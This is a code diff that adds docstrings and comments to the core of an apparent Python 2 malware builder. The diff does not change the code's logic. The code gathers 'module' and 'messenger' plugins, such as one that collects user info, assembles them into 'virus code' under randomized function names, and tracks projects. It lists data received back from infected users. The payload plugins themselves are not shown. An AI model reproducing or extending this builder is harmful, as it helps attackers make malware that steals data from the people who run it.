@@ -15,19 +15,75 @@ except:
 ignoreFiles = [".DS_Store", "__init__.py", "config.py"]
 ignoreEnds = ["pyc","uninit"]
 supportedOS = ["Windows", "Darwin", "Linux"]
+
+# The location of the database
 dataLoc = "db/data.json"
 
-idf = "!@knicky.%s@!"
+# The identification of the strings that needs update
+idf = "!@knicky.%s@!" 
 
+
+
+############################
+#      Utils Functions     #
+############################
 class utils():
     @staticmethod
     def convertSupportedOS(supportedOS):
+        """
+            Convert the supportedOS string to a list
+            
+            :arguments
+            ----------
+            String
+                supportedOS: A string of supportedOS
+            
+            :return
+            -------
+            List
+                A list of supportedOS
+            
+            :example
+            --------
+                >>> convertSupportedOS("['Darwin']")
+                ['Darwin']
+        """
         supportedOS = supportedOS.replace(" ", "")\
             .replace('"', '')
         return supportedOS.split(",")
 
     @classmethod
     def checkFile(cls, fileLines, sender = False):
+        """
+            Check the file and convert it into a dict of important information
+            
+            :arguments
+            ----------
+            String
+                fileLines: The conten of the file
+            Bool
+                sender: Checking the messenger file or module file
+            
+            :return
+            -------
+            Dict
+                A dict of important information (see example)
+            
+            :example
+            --------
+                >>> checkFile(<user.py>)
+                {
+                    "success": 0,
+                    "info": "None",
+                    "sys": ["Windows", "Darwin", "Linux"],
+                    "name": "userInfo",
+                    "desc": "Get User Info",
+                    "sendCode": <codes using a randomly generated function name>,
+                    "sendCodeFunc": <randomly generated function name>,
+                    "receiveCode": "",
+                    "receiveCodeFunc": ""
+                }
+        """
         _regex = "__%s__.*?=.*?(\'|\")(.*?)(\'|\")"
         _sys = re.compile("__%s__.*?=.*?\[(.*?)\]" % "sys")
         _name = re.compile(_regex % "name")
@@ -69,6 +125,21 @@ class utils():
 
     @staticmethod
     def checkContent(info, file):
+        """
+            Check the output of checkFile
+            
+            :arguments
+            ----------
+            Dict
+                info: The output of checkFile
+            String
+                file: file path
+            
+            :return
+            -------
+            List
+                The modified output of checkFile
+        """
         for i in info["sys"]:
             if i not in supportedOS:
                 info["success"] = 1
@@ -88,6 +159,21 @@ class utils():
 
     @staticmethod
     def checkModuleInt(info, file):
+        """
+            Check the abstract syntax tree
+            
+            :arguments
+            ----------
+            Dict
+                info: The output of checkFile
+            String
+                file: file path
+            
+            :return
+            -------
+            List
+                The modified output of checkFile
+        """
         try:
             code = open(file).read()
             for i in ast.walk(ast.parse(code)):
@@ -119,12 +205,42 @@ class utils():
 
     @classmethod
     def checkModule(cls, info, file):
+        """
+            Check the module
+            
+            :arguments
+            ----------
+            Dict
+                info: The output of checkFile
+            String
+                file: file path
+            
+            :return
+            -------
+            List
+                The output of checkContent
+        """
         return cls.checkContent(
             cls.checkModuleInt(info, file), 
             file)
 
     @staticmethod
     def checkSendInt(info, file):
+        """
+            Check the messenger's abstract syntax tree
+            
+            :arguments
+            ----------
+            Dict
+                info: The output of checkFile
+            String
+                file: file path
+            
+            :return
+            -------
+            List
+                The modified output of checkFile
+        """
         try:
             code = open(file).read()
             for i in ast.walk(ast.parse(code)):
@@ -169,12 +285,37 @@ class utils():
 
     @classmethod
     def checkSend(cls, info, file):
+        """
+            Check the messenger
+            
+            :arguments
+            ----------
+            Dict
+                info: The output of checkFile
+            String
+                file: file path
+            
+            :return
+            -------
+            List
+                The output of checkContent
+        """
         return cls.checkContent(
             cls.checkSendInt(info, file), 
             file)
 
     @staticmethod
     def checkAva(module, info, platform):
+        """
+            Check the availability of the module/messenger
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         moduleNames = [x["name"] for x in info]
         if module in moduleNames:
             for i in info:
@@ -194,6 +335,16 @@ class utils():
 
     @staticmethod
     def visitJSON():
+        """
+            Visit the database
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         try:
             data = json.loads(open(dataLoc).read())
             return data
@@ -203,10 +354,30 @@ class utils():
     
     @staticmethod
     def getSHA1(content):
+        """
+            Get SHA1 of the content
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         return str(hashlib.sha1(content).hexdigest())
 
     @staticmethod
     def updateFile(fileName, updateList):
+        """
+            Update uninited modules/messengers
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         try:
             file = open(fileName, 'r')
             newFile = open(fileName.replace("uninit", "py"), 
@@ -223,9 +394,23 @@ class utils():
             return "[!] Error in updating"
 
 
+
+############################
+#         Core API         #
+############################
 class API():
     @staticmethod
     def getModuleInfo(path='module'):
+        """
+            Get all information of all modules
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         moduleInfo = []
         for dirpath,dirnames,filenames in os.walk(path):
             for file in filenames:
@@ -241,6 +426,16 @@ class API():
 
     @staticmethod
     def getSendInfo(path='messenger'):
+        """
+            Get all information of all messengers
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         sendInfo = []
         for dirpath,dirnames,filenames in os.walk(path):
             for file in filenames:
@@ -259,6 +454,16 @@ class API():
         projName, platform = 'Darwin',
         sendPath = 'messenger',
         modulePath = "module"):
+        """
+            Generate the virus code
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         moduleInfo = cls.getModuleInfo(modulePath)
         sendInfo = cls.getSendInfo(sendPath)
         realModuleList = []
@@ -291,6 +496,16 @@ class API():
     def createReceive(cls, sendList,
         projName, platform = 'Darwin',
         sendPath = 'messenger'):
+        """
+            Generate the receiving code
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         sendInfo = cls.getSendInfo(sendPath)
         realSendList = []
         for send in enumerate(sendList):
@@ -316,6 +531,16 @@ class API():
             random.randint(0,20000)))).replace("=", ""),
         sendPath = 'messenger',
         modulePath = "module"):
+        """
+            Create a virus project
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         print "[*] The project name is %s" % projName
         data = utils.visitJSON()
         projects = data["projects"]
@@ -336,6 +561,16 @@ class API():
 
     @staticmethod
     def listProj():
+        """
+            List all projects
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         data = utils.visitJSON()
         result = []
         for i in data["projects"]:
@@ -347,6 +582,16 @@ class API():
 
     @staticmethod
     def getReceiveCode(projName):
+        """
+            Get receiving code from database
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         data = utils.visitJSON()
         receiveCode = ""
         for i in data["projects"]:
@@ -356,6 +601,16 @@ class API():
 
     @staticmethod
     def getVirusCode(projName):
+        """
+            Get virus code from database
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         data = utils.visitJSON()
         virusCode = ""
         for i in data["projects"]:
@@ -365,6 +620,16 @@ class API():
 
     @classmethod
     def receiveInfo(cls, projName, _range = 10):
+        """
+            Receive the response of the virus
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         data = utils.visitJSON()
         receiveCode = cls.getReceiveCode(projName)
         if receiveCode == "":
@@ -376,18 +641,53 @@ class API():
             return receiveObj
 
 
+
+############################
+#       CLI Functions      #
+############################
 class beautify():
+    #Utils part
     @classmethod
     def getTime(cls, timestamp):
+        """
+            Convert timestamp to local time
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         return time.strftime("%Y-%m-%d %H:%M:%S", 
                     time.localtime(float(timestamp)))
 
     @classmethod
     def b64(cls, _str):
+        """
+            Convert string to base64
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         return base64.b64decode(_str)
 
     @classmethod
     def tm(cls, result):
+        """
+            Output a table in terminal
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         try:
             return terminaltables.AsciiTable(result).table
         except Exception as e:
@@ -395,6 +695,16 @@ class beautify():
 
     @classmethod
     def bM(cls, info):
+        """
+            Convert modules/messenger information to terminaltable type
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         result = [["Name", "Description", "SupportedOS", "Status"]]
         for i in info:
             if i["success"] == 0:
@@ -407,6 +717,16 @@ class beautify():
 
     @classmethod
     def bC(cls, info):
+        """
+            Convert project information to terminaltable type
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         result = [["Name", "Time"]]
         for i in info:
             result.append([i["name"], cls.getTime(i["time"])])
@@ -414,6 +734,16 @@ class beautify():
 
     @classmethod
     def bR(cls, info):
+        """
+            Convert receive information to terminaltable type
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         result = [["Module", "From User", "Date", "Content"]]
         for i in info:
             result.append([i["_byModule"], i["_from"], 
@@ -423,33 +753,92 @@ class beautify():
 
     @classmethod
     def bS(cls, info):
+        """
+            Convert update information to terminaltable type
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         result = [["Argument", "Description"]]
         for i in info:
             result.append([i["original"], i["desc"]])
         return cls.tm(result)
 
+    #Main part
+    @classmethod
+    def showInfo(cls, updateList):
+        """
+            Show information of update
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
+        return cls.bS(updateList)
+
     @classmethod
     def getModuleInfo(cls, path='module'):
+        """
+            Show information of modules
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         info = API.getModuleInfo(path)
         return cls.bM(info)
 
     @classmethod
     def getSendInfo(cls, path='messenger'):
+        """
+            Show information of messengers
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         info = API.getModuleInfo(path)
         return cls.bM(info)
 
     @classmethod
     def listProj(cls):
+        """
+            List all projects in database
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         info = API.listProj()
         return cls.bC(info)
 
     @classmethod
     def receiveInfo(cls, projName, _range = 10):
+        """
+            Receive information from virus
+            
+            :arguments
+            ----------
+            
+            :return
+            -------
+            
+        """
         info = API.receiveInfo(projName, _range)
         return cls.bR(info)
-
-    @classmethod
-    def showInfo(cls, updateList):
-        return cls.bS(updateList)
-
-
